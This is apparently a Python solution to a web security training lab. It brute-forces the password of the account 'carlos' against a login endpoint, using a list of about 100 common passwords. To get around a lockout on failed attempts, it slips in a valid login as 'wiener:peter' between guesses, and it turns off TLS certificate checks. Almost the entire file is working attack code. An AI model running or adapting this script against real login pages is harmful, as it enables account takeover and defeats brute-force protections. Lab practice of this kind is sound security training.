import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


password_list = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",
    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow"
]


memo = ["carlos"]


def rotate_login_cred():
    if memo[-1] == "wiener":
        memo.append("carlos")
        return memo[-1]
    if memo[-1] == "carlos":
        memo.append("wiener")
        return memo[-1]


def get_password(url):
    for key in range(0, len(password_list)):
        user = rotate_login_cred()
        if user == "wiener":
            params = 'username=wiener&password=peter'
            r = requests.post(url + '/login', data=params,
                              verify=False)
        if user != "carlos":
            user = rotate_login_cred()
            params = f'username={user}&password={password_list[key]}'
            r = requests.post(url + '/login', data=params,
                              verify=False)
            if "Your username is" in r.text:
                print(f"Password is: {password_list[key]}")


def main():
    if len(sys.argv) != 2:
        print('add url: example.com')
        sys.exit(-1)

    url = sys.argv[1]
    print('cracking password...')
    get_password(url)


if __name__ == '__main__':
    main()
